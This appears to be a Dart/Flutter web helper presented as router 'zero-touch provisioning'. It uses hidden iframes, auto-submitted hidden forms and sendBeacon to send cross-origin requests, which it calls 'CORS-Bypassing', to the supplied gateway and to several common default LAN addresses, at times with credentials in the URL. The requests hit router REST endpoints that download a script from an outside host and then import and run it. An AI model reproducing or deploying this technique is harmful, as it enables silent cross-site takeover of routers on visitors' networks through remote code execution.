import 'dart:async';
import 'dart:convert';
import 'dart:html' as html;
import 'package:flutter/foundation.dart';

void _submitHiddenForm(String url, String jsonBody) {
  try {
    final iframeName = 'ztp_iframe_${DateTime.now().millisecondsSinceEpoch}_${(1000 * (1 + DateTime.now().microsecond)).toInt()}';
    final iframe = html.IFrameElement()
      ..name = iframeName
      ..style.display = 'none';
    html.document.body?.children.add(iframe);

    final form = html.FormElement()
      ..method = 'POST'
      ..action = url
      ..target = iframeName
      ..style.display = 'none';

    final input = html.InputElement()
      ..type = 'hidden'
      ..name = 'data'
      ..value = jsonBody;
    form.children.add(input);

    html.document.body?.children.add(form);
    form.submit();

    Future.delayed(const Duration(seconds: 4), () {
      form.remove();
      iframe.remove();
    });
  } catch (e) {
    if (kDebugMode) {
      debugPrint('⚠️ Error in _submitHiddenForm: $e');
    }
  }
}

Future<bool> executeWebZtpFormProvisioning({
  required String gatewayIp,
  required String bootstrapToken,
  required String routerName,
  String username = 'admin',
  String password = '',
}) async {
  try {
    if (kDebugMode) {
      debugPrint('⚡ [WebZtpHelper] Executing CORS-Bypassing Form & Beacon ZTP to $gatewayIp ($username)...');
    }

    final bootstrapUrl = 'https://staging.wifi-4u.net/v1/bootstrap/$bootstrapToken/';
    final encodedAuthUser = Uri.encodeComponent(username);
    final encodedAuthPass = Uri.encodeComponent(password);

    final candidateHosts = [
      'http://$gatewayIp',
      'https://$gatewayIp',
      'http://192.168.88.1',
      'https://192.168.88.1',
      'http://192.168.1.1',
      'http://192.168.0.1',
      'http://10.0.0.1',
    ];

    if (password.isNotEmpty) {
      candidateHosts.addAll([
        'http://$encodedAuthUser:$encodedAuthPass@$gatewayIp',
        'http://$encodedAuthUser:$encodedAuthPass@192.168.88.1',
        'http://$encodedAuthUser:$encodedAuthPass@192.168.1.1',
        'http://$encodedAuthUser:$encodedAuthPass@192.168.0.1',
      ]);
    }

    for (final host in candidateHosts) {
      // 1. Payload 1: /rest/tool/fetch
      final json1 = jsonEncode({
        'url': bootstrapUrl,
        'mode': 'https',
        'output': 'file',
        'dst-path': 'bootstrap.rsc',
      });

      _submitHiddenForm('$host/rest/tool/fetch', json1);

      try {
        final blob1 = html.Blob([json1], 'application/json');
        html.window.navigator.sendBeacon('$host/rest/tool/fetch', blob1);
      } catch (_) {}

      await Future.delayed(const Duration(milliseconds: 1200));

      // 2. Payload 2: /rest/system/script
      final json2 = jsonEncode({
        'name': 'import-bootstrap-script',
        'source': '/import file-name=bootstrap.rsc',
      });

      _submitHiddenForm('$host/rest/system/script', json2);

      try {
        final blob2 = html.Blob([json2], 'application/json');
        html.window.navigator.sendBeacon('$host/rest/system/script', blob2);
      } catch (_) {}

      await Future.delayed(const Duration(milliseconds: 1000));

      // 3. Payload 3: /rest/system/script/import-bootstrap-script/run
      final json3 = jsonEncode({});

      _submitHiddenForm('$host/rest/system/script/import-bootstrap-script/run', json3);

      try {
        final blob3 = html.Blob([json3], 'application/json');
        html.window.navigator.sendBeacon('$host/rest/system/script/import-bootstrap-script/run', blob3);
      } catch (_) {}

      await Future.delayed(const Duration(milliseconds: 800));
    }

    if (kDebugMode) {
      debugPrint('✅ [WebZtpHelper] Form & Beacon ZTP dispatched across all candidate hosts!');
    }
    return true;
  } catch (e) {
    if (kDebugMode) {
      debugPrint('⚠️ [WebZtpHelper] Error in executeWebZtpFormProvisioning: $e');
    }
    return false;
  }
}
